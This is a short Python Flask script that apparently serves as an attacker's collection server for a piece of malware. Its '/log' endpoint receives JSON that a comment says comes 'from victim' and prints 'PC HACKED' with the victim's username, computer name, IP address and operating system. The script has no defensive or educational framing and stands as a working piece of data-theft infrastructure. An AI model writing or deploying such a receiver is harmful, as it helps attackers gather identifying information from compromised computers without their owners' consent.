from flask import Flask, request

app = Flask(__name__)


@app.route('/', methods=['GET'])
def main():
    return "WORKING", 200

@app.route('/log', methods=['POST'])
def log_data():
    data = request.json  # getting json data from victim
    if data:
        print("\n🚨 PC HACKED 🚨")
        print(f"👤 user: {data.get('user', 'Unknown')}")
        print(f"💻 pc's name: {data.get('computer', 'Unknown')}")
        print(f"🌐 IP-address: {data.get('ip', 'Unknown')}")
        print(f"🖥 OS: {data.get('os', 'Unknown')}")
    return "OK", 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)  # starting web server on port 5000